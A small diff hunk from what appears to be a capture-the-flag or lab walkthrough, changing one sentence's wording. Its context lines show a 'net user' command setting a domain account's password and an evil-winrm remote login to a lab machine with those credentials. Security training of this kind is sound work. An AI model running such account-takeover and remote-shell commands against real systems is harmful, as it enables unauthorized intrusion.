@@ -352,7 +352,7 @@ net user ca_admin Passw0rd123!@# /domain
 The command completed successfully.
 ```
 
-We have gained access to the machine as the 'ca_admin' user!
+We gain access to the machine as the 'ca_admin' user!
 ```
 ┌──(kali㉿kali)-[~/Captivity]
 └─$ evil-winrm -u ca_admin -p 'Passw0rd123!@#' -i 192.168.100.130        
